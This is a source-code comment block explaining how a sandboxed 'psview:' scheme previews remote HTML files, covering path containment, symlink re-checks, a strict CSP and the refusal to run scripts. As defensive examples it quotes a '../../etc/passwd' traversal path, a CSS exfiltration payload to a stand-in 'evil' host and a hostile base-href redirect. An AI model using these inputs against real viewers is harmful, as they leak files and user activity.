/**
 * Serves a remote HTML file — and the assets it asks for — to a sandboxed
 * iframe in the Files tab, over a custom `psview:` scheme.
 *
 * Markdown goes through the same door, converted to HTML on the way out (see
 * markdownDocument.ts, and {@link openMarkdown} below). The class keeps its
 * name because what it serves is still HTML: markdown is an INPUT format that
 * has become HTML by the time any of the reasoning below applies to it.
 *
 * ## Why a scheme and not a blob URL
 *
 * The other viewers in the Files tab (image, audio, PDF) put the file's bytes
 * behind an object URL and point an element at it. That works because those
 * formats are SELF-CONTAINED. An HTML page is not: it is a document plus a
 * graph of things it references by RELATIVE URL, and a blob URL has no path,
 * so `<link href="style.css">` inside a blob-hosted document resolves to
 * nothing at all. Every real page would have rendered unstyled — which is the
 * failure mode that looks like a bad stylesheet rather than like a missing
 * feature, and is the one thing this was not allowed to ship as.
 *
 * A registered scheme gives the frame a real base URL. `psview://<token>/the/
 * remote/path.html` resolves `style.css` to `psview://<token>/the/remote/
 * style.css` by itself, which arrives back here as another request that we
 * answer with another SFTP read. Nothing parses the HTML, nothing rewrites a
 * URL, and it works at any depth and through any indirection — a stylesheet
 * that `@import`s another stylesheet that names a `@font-face` file resolves
 * exactly the same way, which is precisely the class of case that inlining
 * same-directory assets would have missed.
 *
 * ## What this means, and the two things that make it safe
 *
 * It means an untrusted document decides which remote paths this app reads.
 * That is a path-traversal boundary of the kind LocalFileReader's header
 * argues about, and it is answered the same way — by narrowing, not by
 * sanitising:
 *
 *  1. **One directory.** Every request is folded to an absolute path
 *     (previewPaths.normalisePosixPath), checked for containment in the
 *     previewed file's own directory, then re-resolved on the HOST with
 *     `realpath` and checked AGAIN. The first check refuses a path that
 *     spells its way out (`../../etc/passwd`, `%2e%2e/`); the second refuses
 *     one that walks out through a symlink, which no amount of string work
 *     can see. Neither is sufficient alone.
 *  2. **No network, no scripts.** Every response carries a
 *     `Content-Security-Policy` header of its own (see {@link FRAME_CSP}),
 *     and the frame is additionally `sandbox`ed with no tokens by the
 *     renderer. The document cannot execute anything, cannot open a socket,
 *     cannot submit a form and cannot load a single byte from any origin but
 *     this handler.
 *
 * Read those together and the interesting property falls out: the worst a
 * hostile page can do is DISPLAY, to the user, the contents of files that are
 * in the folder the user just opened — which they can already read, since
 * they are browsing that folder over SFTP. There is no channel by which it can
 * tell anyone else what it found, because there is no channel at all.
 *
 * ## What is deliberately NOT granted
 *
 * `supportFetchAPI` and `allowServiceWorkers` are off in the scheme's
 * privileges. Nothing needs them: a page with no scripts cannot call `fetch`,
 * and a service worker would be a persistent thing left behind by a document
 * that is supposed to vanish when the tab closes. `bypassCSP` is off for the
 * obvious reason — the whole design rests on the CSP being enforced.
 * `corsEnabled` IS on, and is explained at {@link SCHEME_PRIVILEGES}.

 *                        In particular this is what blocks `<img
 *                        src="https://tracker/...">`: rendering a remote
 *                        page must not tell a third party WHICH file on
 *                        which host the user is currently inspecting, which
 *                        is a real leak even when the page is not otherwise
 *                        malicious (analytics beacons and CDN fonts do it by
 *                        accident).
 *   script-src 'none'    See "the scripts decision" below.
 *   style-src psview:    Stylesheets from this handler only...
 *     'unsafe-inline'    ...plus `<style>` blocks and `style=` attributes,
 *                        which essentially every hand-written page uses and
 *                        which cannot be nonce'd without rewriting the
 *                        document. This is the one relaxation here, and it is
 *                        affordable precisely because of the directives
 *                        around it: the classic CSS exfiltration trick is
 *                        `background:url(https://evil/?leak)`, and there is
 *                        no directive on this policy that permits a remote
 *                        URL for anything.
 *   img/font/media-src   Same-scheme assets, plus `data:` for images and
 *                        fonts, which are self-contained and reach no
 *                        network.
 *   connect-src 'none'   Belt to script-src's braces.
 *   form-action 'none'   A page cannot POST what it read anywhere, which
 *                        matters because a form submission is a navigation
 *                        and would otherwise not be covered by connect-src.
 *   base-uri 'none'      A `<base href="https://evil/">` would otherwise
 *                        re-point every relative URL in the document off
 *                        this scheme entirely — the one line that could undo
 *                        the whole policy from inside the document.
 *   frame-src 'none'     No nested frames: an `<iframe src="...">` inside the
 *                        page would be a second document with its own
 *                        chance to get a policy wrong.
 *   sandbox              Same as the iframe attribute the renderer sets, said
 *                        again here so that the guarantee travels with the
 *                        RESPONSE. If anything in this app ever loads a
 *                        psview: URL somewhere other than that one carefully
 *                        written `<iframe sandbox>`, it is still an opaque
 *                        origin with no scripts, no forms and no popups.
 *
 * ## The scripts decision
 *
 * Scripts are refused outright rather than run under `allow-scripts`
 * (the usual "scripts but opaque origin" compromise).
 *
 * What that costs: a page whose content is GENERATED at runtime — a Plotly
 * chart, a client-rendered coverage report, anything Jupyter emits with
 * `require.js` — renders as its static skeleton, which may be nearly empty.
 * That is a real loss and the UI says so out loud whenever the source
 * contains a `<script>` tag, rather than presenting an empty page as the
 * page.
 *
 * What it buys: the preview has NO EXECUTION at all. With `allow-scripts` the
 * accepted threat would be "arbitrary attacker-chosen JavaScript runs inside
 * our renderer process, and we are relying on the opaque origin, the absent
 * preload in subframes, and Chromium's site isolation to contain it" — three
 * mechanisms, any one of which being wrong on some platform or some Electron
 * version is a full compromise of a process that holds SSH sessions. Without
 * it there is nothing to contain: no timers, no DOM mutation, no resource
 * amplification beyond the request caps above, and no dependence on how
 * origins were computed. For a feature whose job is "let me look at an HTML
 * file I found on a server", that trade is not close.
 *
 * If this is ever revisited, note that `allow-scripts` alone is not enough to
 * make it safe — `connect-src 'none'` and the absence of `allow-same-origin`
 * both have to stay, and the request caps become load-bearing rather than
 * merely prudent.
